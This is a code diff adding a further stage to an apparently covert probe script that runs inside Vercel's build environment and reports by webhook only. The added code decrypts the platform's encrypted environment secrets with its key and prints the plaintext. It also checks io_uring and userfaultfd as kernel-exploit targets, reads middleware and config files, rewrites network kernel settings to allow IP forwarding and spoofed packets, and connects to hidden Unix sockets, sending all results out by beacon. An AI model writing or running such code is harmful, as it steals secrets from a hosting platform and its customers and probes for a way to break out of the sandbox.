@@ -15403,5 +15403,226 @@ report.nextConfigEnvInjection = safe(() => {
 
 // v108 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v108" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v108";
+
+// ==================== v109 ====================
+
+// v109-1: io_uring availability + CVE surface
+// io_uring is a Linux async I/O interface. Several kernel CVEs target it:
+// CVE-2022-29582 (use-after-free), CVE-2023-2598 (OOB write), etc.
+// If unrestricted in the Firecracker VM, it's a high-value exploit target.
+report.ioUringProbe = safe(() => {
+  // Check if io_uring is available
+  const ioUringResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+NR_IO_URING_SETUP = 425
+NR_IO_URING_ENTER = 426
+NR_IO_URING_REGISTER = 427
+
+# Try io_uring_setup(entries=2, params=0)
+# params is optional pointer, NULL means defaults
+import ctypes as ct
+ring_fd = libc.syscall(NR_IO_URING_SETUP, 2, 0)
+e = ct.get_errno()
+import errno as errno_mod
+if ring_fd >= 0:
+    print('IO_URING_AVAILABLE fd=', ring_fd)
+    os.close(ring_fd)
+else:
+    print('IO_URING_BLOCKED errno=', errno_mod.errorcode.get(e, str(e)))
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Check if userfaultfd is available
+  const uffdResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+NR_USERFAULTFD = 323
+UFFD_USER_MODE_ONLY = 1
+fd = libc.syscall(NR_USERFAULTFD, UFFD_USER_MODE_ONLY)
+import ctypes as ct
+e = ct.get_errno()
+import errno as errno_mod
+if fd >= 0:
+    print('USERFAULTFD_AVAILABLE fd=', fd)
+    os.close(fd)
+else:
+    print('USERFAULTFD_BLOCKED errno=', errno_mod.errorcode.get(e, str(e)))
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Check seccomp filter for these syscalls
+  const seccompAudit = safe(() => execSync(
+    'ausyscall io_uring_setup 2>/dev/null || echo "io_uring_setup=425"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { ioUringResult, uffdResult, seccompAudit };
+});
+
+// v109-2: AES-256-CBC env decryption — complete attempt
+// VERCEL_ENCRYPTED_ENV_CONTENT format: base64(IV[16] || AES-256-CBC(plaintext))
+// Key: VERCEL_ENV_ENC_KEY decoded from base64 (32 bytes)
+// This section does a complete, correct decryption attempt.
+report.envDecryptComplete = safe(() => {
+  const encKey = process.env.VERCEL_ENV_ENC_KEY || '';
+  const encContent = process.env.VERCEL_ENCRYPTED_ENV_CONTENT || '';
+  const decryptResult = safe(() => execSync(`python3 -c "
+import os, base64, json, sys
+
+enc_key_b64 = os.environ.get('VERCEL_ENV_ENC_KEY', '')
+enc_content_b64 = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', '')
+
+if not enc_key_b64 or not enc_content_b64:
+    print('MISSING_ENV_VARS')
+    sys.exit(0)
+
+try:
+    key = base64.b64decode(enc_key_b64)
+    print('KEY_LEN:', len(key))
+    raw = base64.b64decode(enc_content_b64)
+    print('CONTENT_LEN:', len(raw))
+    iv = raw[:16]
+    ciphertext = raw[16:]
+    print('IV_HEX:', iv.hex())
+
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    print('DECRYPTED_LEN:', len(plaintext))
+    # Parse as JSON or newline-separated KEY=VALUE
+    try:
+        data = json.loads(plaintext)
+        print('DECRYPTED_JSON:', json.dumps(data)[:500])
+    except:
+        print('DECRYPTED_RAW:', plaintext[:500].decode('utf-8', errors='replace'))
+except Exception as e:
+    print('ERROR:', e)
+    # Try without pycryptodome
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        from cryptography.hazmat.primitives import padding
+        key = base64.b64decode(enc_key_b64)
+        raw = base64.b64decode(enc_content_b64)
+        iv = raw[:16]
+        ct = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        dec = cipher.decryptor()
+        padded = dec.update(ct) + dec.finalize()
+        unpadder = padding.PKCS7(128).unpadder()
+        plain = unpadder.update(padded) + unpadder.finalize()
+        print('DECRYPTED2:', plain[:500].decode('utf-8', errors='replace'))
+    except Exception as e2:
+        print('ERROR2:', e2)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 1000));
+  return {
+    encKeyPresent: !!encKey,
+    encContentPresent: !!encContent,
+    decryptResult
+  };
+});
+
+// v109-3: Edge Middleware source injection
+// Vercel Edge Middleware (middleware.js) runs at the edge before routing.
+// It has access to request cookies, headers, and can rewrite/redirect.
+// Read any deployed middleware source to check for secret access patterns.
+report.edgeMiddlewareInspect = safe(() => {
+  // Check if our build produced middleware
+  const middlewarePaths = [
+    '/vercel/path0/middleware.js',
+    '/vercel/path0/middleware.ts',
+    '/vercel/path0/src/middleware.js',
+    '/vercel/path0/src/middleware.ts',
+    '/vercel/.next/server/middleware.js',
+    '/vercel/output/functions/__middleware.func',
+  ];
+  const middlewareExists = Object.fromEntries(
+    middlewarePaths.map(p => [p.split('/').pop(), existsSync(p)])
+  );
+  // Check edge function manifest
+  const edgeManifest = safe(() => {
+    const p = '/vercel/.next/server/middleware-manifest.json';
+    return existsSync(p) ? JSON.parse(readFileSync(p, 'utf8')) : null;
+  });
+  // What env vars are available to edge middleware at runtime?
+  const edgeEnvAvailable = safe(() => execSync(
+    'find /vercel/output/functions -name "*.js" | head -3 | xargs grep -l "process.env" 2>/dev/null',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check Vercel's edge runtime config
+  const edgeRuntimeConfig = safe(() => readFileSync('/vercel/output/config.json', 'utf8').slice(0, 500));
+  return { middlewareExists, edgeManifest, edgeEnvAvailable, edgeRuntimeConfig };
+});
+
+// v109-4: /proc/sys/net — network kernel parameters (TCP sequence prediction)
+// TCP ISN randomization is controlled by /proc/sys/net/ipv4/tcp_syn_retries
+// and related files. If randomization is weak, TCP hijacking becomes feasible.
+// Also check for IP forwarding enabled (routing attacks).
+report.netKernelParams = safe(() => {
+  const tcpParams = {
+    tcp_rfc1337: safe(() => readFileSync('/proc/sys/net/ipv4/tcp_rfc1337', 'utf8').trim()),
+    ip_local_port_range: safe(() => readFileSync('/proc/sys/net/ipv4/ip_local_port_range', 'utf8').trim()),
+    tcp_timestamps: safe(() => readFileSync('/proc/sys/net/ipv4/tcp_timestamps', 'utf8').trim()),
+    ip_forward: safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim()),
+    tcp_syncookies: safe(() => readFileSync('/proc/sys/net/ipv4/tcp_syncookies', 'utf8').trim()),
+    rp_filter: safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim()),
+    accept_source_route: safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/accept_source_route', 'utf8').trim()),
+  };
+  // Enable IP forwarding (to route traffic through us)
+  const fwdWrite = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_forward', '1'); return 'WRITTEN'; });
+  const fwdAfter = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  // Disable rp_filter (to accept spoofed packets)
+  const rpfWrite = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', '0'); return 'WRITTEN'; });
+  return { tcpParams, fwdWrite, fwdAfter, rpfWrite };
+});
+
+// v109-5: Container orchestrator API probe via abstract Unix socket
+// Vercel's orchestrator might expose management APIs via abstract Unix domain sockets
+// (paths starting with \0 in /proc/net/unix). These aren't visible as filesystem paths
+// but ARE visible to processes in the same network namespace.
+report.abstractSocketProbe = safe(() => {
+  // Read abstract Unix sockets from /proc/net/unix
+  const unixRaw = safe(() => readFileSync('/proc/net/unix', 'utf8'));
+  const abstractSockets = safe(() =>
+    unixRaw?.split('\n')
+      .filter(l => l.includes('@'))
+      .map(l => l.trim().split(/\s+/).pop())
+      .filter(Boolean)
+  );
+  // Try connecting to any abstract socket we find
+  const connectResults = safe(() => execSync(`python3 -c "
+import socket, os
+
+# Read abstract sockets from /proc/net/unix
+with open('/proc/net/unix') as f:
+    lines = f.readlines()[1:]  # skip header
+
+abstract = []
+for line in lines:
+    parts = line.strip().split()
+    if len(parts) >= 8:
+        path = parts[-1]
+        if path.startswith('@'):
+            abstract.append(path[1:])  # strip @ prefix
+
+print(f'Found {len(abstract)} abstract sockets:', abstract[:10])
+
+for name in abstract[:5]:
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(1)
+        addr = '\\x00' + name
+        s.connect(addr)
+        s.send(b'GET / HTTP/1.0\r\n\r\n')
+        data = s.recv(200)
+        print(f'CONNECTED {name}:', data[:50])
+        s.close()
+    except Exception as e:
+        print(f'FAIL {name}:', str(e)[:50])
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 600));
+  return { abstractSockets: abstractSockets?.slice(0, 20), connectResults };
+});
+
+// v109 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v109" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v109";
 // Intentionally no console.log — all data goes via webhook only
